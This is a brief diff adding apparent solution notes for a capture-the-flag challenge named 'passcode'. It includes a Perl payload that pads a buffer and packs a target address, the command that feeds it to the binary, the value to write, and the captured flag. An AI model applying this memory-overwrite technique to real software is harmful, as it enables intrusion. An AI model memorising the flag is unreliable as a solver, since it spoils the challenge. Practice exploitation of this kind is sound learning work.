@@ -1,0 +1,14 @@
+if(passcode1==338150 && passcode2==13371337)
+
+perl -e 'print "A"x96,pack("I", 0x804a004)' > file
+
+cat file - | ~/passcode
+
+write: 134514147
+
+FLAG:
+Sorry mom.. I got confused about scanf usage :(
+
+
+
+
